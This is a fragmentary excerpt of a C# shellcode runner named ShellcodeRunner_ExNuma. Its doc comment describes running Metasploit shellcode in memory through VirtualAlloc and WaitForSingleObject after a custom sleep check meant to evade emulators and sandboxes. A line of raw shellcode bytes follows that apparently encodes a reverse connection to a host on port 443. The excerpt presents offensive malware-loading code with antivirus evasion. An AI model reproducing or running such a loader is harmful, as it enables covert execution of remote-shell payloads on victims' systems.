...
namespace ShellcodeRunner_ExNuma
{
    internal class SCRunner_ExNuma
    {
        ...
        /// <summary>
        /// Will execute a MSF C# shellcode in memory using PInvoke's 'WaitForSingleObject'
        /// and will allocate memory using VirtualAlloc. Will "await" for execution of the
        /// custom sleep function SleepForEmu() then will proceed forward. If sleep func fails
        /// it would've already exited.
        /// </summary>
...
0x49,0xbc,0x02,0x00,0x01,0xbb,0x0a,0x0a,0x00,0x80,0x41,0x54,0x49,0x89,0xe4,
